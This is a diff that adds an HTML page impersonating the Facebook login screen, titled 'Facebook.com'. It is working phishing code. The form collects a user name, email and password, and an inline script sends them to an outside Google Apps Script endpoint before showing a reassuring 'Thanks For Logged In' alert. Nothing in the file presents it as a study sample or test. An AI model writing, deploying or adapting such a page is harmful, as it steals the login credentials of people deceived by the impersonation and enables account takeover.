@@ -1,0 +1,47 @@
+
+<html>
+<head>
+	<title>Facebook.com</title>
+	<link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+					<header>
+					<div class="header-block">
+					<p>Facebook Login</p>
+					<br><br>
+				<p2>Log in to your account</p2>
+				</div></--/header-block -->
+				</header>
+				</div>
+<div class="panel-body"><br>
+	<div class="box"><br>
+<form method="post" autocomplete="off" name="google-sheet" >
+	<div class="form-group">
+	<label for="username">User Name </label>
+	<input type="text" class="form-control" id="username" name="username" placeholder="User Name" required><br>
+</div>
+<div class="form-group">
+	<label for="email">Email</label>
+	<input type="text" class="form-control" id="email" name="email" placeholder="Email" required><br>
+</div>
+<div class="form-group">
+	<label for="password"> Password </label>
+	<input type="password" class="form-control" id="password" name="password" placeholder="Password" required><br>
+	<input type="Submit" class="btn btn-primary" value="Log In">
+</div>
+	<script>
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbwshtK99LiRQT0FwuCWW13xQp_EJ2hG1jr73oxz-LqduCltIyTf/exec'
+            const form = document.forms['google-sheet']
+          
+            form.addEventListener('submit', e => {
+              e.preventDefault()
+              fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+                .then(response => alert("Thanks For Logged In. We will contact you soon"))
+                .catch(error => console.error('Error!', error.message))
+            })
+          </script>
+
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</body>
+</html>
